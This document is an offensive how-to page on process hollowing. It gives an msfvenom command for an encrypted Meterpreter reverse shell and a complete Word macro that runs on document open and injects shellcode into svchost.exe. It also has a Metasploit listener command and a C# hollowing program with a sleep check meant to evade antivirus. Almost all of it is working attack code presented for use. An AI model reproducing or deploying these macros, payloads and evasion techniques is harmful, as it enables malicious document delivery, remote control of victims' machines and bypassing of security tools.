# Process Hollowing

## Encrypted Meterpreter

### 1) Create shellcode

    # If you change the key, then change it in the vba code too
    msfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'

### 2) Create a new Macro file

Insert your shellcode from step above and save the file as a .docm, in this case it will inject into notepad.exe but you can change this

    #If Win64 Then
        Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
        Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
        Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
        Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
        Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
        Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
        Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
        Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
        Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
        Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
    #Else
        Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
        Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
        Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
        Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
        Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
        Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
        Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
        Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
        Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
        Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
    #End If
    
    Private Type PROCESS_BASIC_INFORMATION
        Reserved1 As LongPtr
        PebAddress As LongPtr
        Reserved2 As LongPtr
        Reserved3 As LongPtr
        UniquePid As LongPtr
        MoreReserved As LongPtr
    End Type
    
    Private Type STARTUPINFOA
        cb As Long
        lpReserved As String
        lpDesktop As String
        lpTitle As String
        dwX As Long
        dwY As Long
        dwXSize As Long
        dwYSize As Long
        dwXCountChars As Long
        dwYCountChars As Long
        dwFillAttribute As Long
        dwFlags As Long
        wShowWindow As Integer
        cbReserved2 As Integer
        lpReserved2 As String
        hStdInput As LongPtr
        hStdOutput As LongPtr
        hStdError As LongPtr
    End Type
    
    Private Type PROCESS_INFORMATION
        hProcess As LongPtr
        hThread As LongPtr
        dwProcessId As Long
        dwThreadId As Long
    End Type
    
    Sub Document_Open()
        hollow
    End Sub
    
    Sub AutoOpen()
        hollow
    End Sub
    
    ' Performs process hollowing to run shellcode in svchost.exe
    Function hollow()
        Dim si As STARTUPINFOA
        RtlZeroMemory si, Len(si)
        si.cb = Len(si)
        si.dwFlags = &H100
        Dim pi As PROCESS_INFORMATION
        Dim procOutput As LongPtr
        ' Start svchost.exe in a suspended state
        procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
        
        Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
        Dim ProcInfo As LongPtr
        ProcInfo = pi.hProcess
        Dim PEBinfo As LongPtr
    
    #If Win64 Then
        zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
        PEBinfo = ProcBasicInfo.PebAddress + 16
        Dim AddrBuf(7) As Byte
    #Else
        zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
        PEBinfo = ProcBasicInfo.PebAddress + 8
        Dim AddrBuf(3) As Byte
    #End if
    
        Dim tmp As Long
        tmp = 0
    #If Win64 Then
        ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
        readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
        svcHostBase = AddrBuf(7) * (2 ^ 56)
        svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
        svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
        svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
        svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
        svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
        svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
        svcHostBase = svcHostBase + AddrBuf(0)
    #Else
        ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
        readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
        svcHostBase = AddrBuf(3) * (2 ^ 24)
        svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
        svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
        svcHostBase = svcHostBase + AddrBuf(0)
    #End if
    
        Dim data(512) As Byte
        ' Read more data from PEB so e_lfanew offset can be retrieved
        readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
        
        ' Read e_lfanew offset value and add 40
        Dim e_lfanew_offset As Long
        e_lfanew_offset = data(60)
    
        Dim opthdr As Long
        opthdr = e_lfanew_offset + 40
        
        ' Construct relative virtual address for svchost's entry point
        Dim entrypoint_rva As Long
        entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
        entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
        entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
        entrypoint_rva = entrypoint_rva + data(opthdr)
    
        Dim addressOfEntryPoint As LongPtr
        ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
        addressOfEntryPoint = entrypoint_rva + svcHostBase
        
        ' Buffer for malicious crypted shellcode needs to go here
        Dim sc As Variant
        Dim key As String
        ' TODO change the key
        key = "CHANGEMYKEY"
    
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'
    sc = Array(145,145,252,...,180)
    
        Dim scSize As Long
        scSize = UBound(sc)
        ' Decrypt shellcode
        Dim keyArrayTemp() As Byte
        keyArrayTemp = key
        
        i = 0
        For x = 0 To UBound(sc)
            sc(x) = sc(x) Xor keyArrayTemp(i)
            i = (i + 2) Mod (Len(key) * 2)
        Next x
        
        ' TODO set the SIZE here (use a size > to the shellcode size)
        Dim buf(685) As Byte
        For y = 0 To UBound(sc)
            buf(y) = sc(y)
        Next y
        
        ' Write the shellcode into the svchost.exe entry point
        a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
        ' Resume svchost.exe process to run the shellcode
        b = ResumeThread(pi.hThread)
     
    End Function

### 3) Start Metasploit listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

### 4) Deliver Macro

## Process Hollowing with Sleeper for AV Detection

 This C# program implements process hollowing via entry-point overwrite inside a suspended process. It starts a benign process (svchost.exe) suspended, walks the target process's PEB to find the loaded image base and the PE header, computes the process entrypoint address (handling ASLR), XOR-decodes an embedded shellcode blob, writes that decoded payload directly over the target process's entrypoint, and then resumes the main thread so the injected payload runs in the context of the host process.

 ### High-level steps (mapped to the code)

1.Create the target process in a suspended state using CreateProcess (CREATE_SUSPENDED).

2.Query the target's PEB to get the image base using ZwQueryInformationProcess.

3.Read the on-disk/loaded PE headers from the target with ReadProcessMemory to locate the entrypoint RVA.

4.Compute the absolute entrypoint address by adding the image base + RVA.

5.XOR-decode the embedded shellcode and overwrite the entrypoint with WriteProcessMemory.

6.Resume the suspended thread to run the injected payload using ResumeThread

#### Code

    using System;
    using System.Runtime.InteropServices;
    
    namespace ProcessHollowing
    {
        public class Program
        {
            public const uint CREATE_SUSPENDED = 0x4;
            public const int PROCESSBASICINFORMATION = 0;
    
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
            public struct ProcessInfo
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public Int32 ProcessId;
                public Int32 ThreadId;
            }
    
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
            public struct StartupInfo
            {
                public uint cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public uint dwX;
                public uint dwY;
                public uint dwXSize;
                public uint dwYSize;
                public uint dwXCountChars;
                public uint dwYCountChars;
                public uint dwFillAttribute;
                public uint dwFlags;
                public short wShowWindow;
                public short cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            internal struct ProcessBasicInfo
            {
                public IntPtr Reserved1;
                public IntPtr PebAddress;
                public IntPtr Reserved2;
                public IntPtr Reserved3;
                public IntPtr UniquePid;
                public IntPtr MoreReserved;
            }
    
            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);
    
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
                IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
                [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);
    
            [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
            private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
                ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
                int dwSize, out IntPtr lpNumberOfbytesRW);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern uint ResumeThread(IntPtr hThread);
    
            public static void Main(string[] args)
            {
                // AV evasion: Sleep for 10s and detect if time really passed
                DateTime t1 = DateTime.Now;
                Sleep(10000);
                double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
                if (deltaT < 9.5)
                {
                    return;
                }
    
                // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
                // XORed with key 0xfa
                byte[] buf = new byte[511] {
                0x06, 0xb2, 0x36...
                0x2f
                };
    
                // Start 'svchost.exe' in a suspended state
                StartupInfo sInfo = new StartupInfo();
                ProcessInfo pInfo = new ProcessInfo();
                bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                    false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
                Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
    
                // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
                ProcessBasicInfo pbInfo = new ProcessBasicInfo();
                uint retLen = new uint();
                long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
                IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
                Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
    
                // Get entry point of the actual process executable
                // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
                // From the PEB (address we got in last call), we have to do the following:
                // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
                // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
                // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
                // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
                // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
    
                // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
                byte[] procAddr = new byte[0x8];
                byte[] dataBuf = new byte[0x200];
                IntPtr bytesRW = new IntPtr();
                bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
                IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
                result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
                Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
    
                // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
                uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
                Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
    
                // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
                uint rvaOffset = e_lfanew + 0x28;
                Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
    
                // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
                uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
                Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");
    
                // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
                IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
                Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
    
                // Carrying on, decode the XOR payload
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                }
                Console.WriteLine("XOR-decoded payload.");
    
                // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
                result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
                Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");
    
                // Resume the thread to trigger our payload
                uint rResult = ResumeThread(pInfo.hThread);
                Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
            }
        }
    }

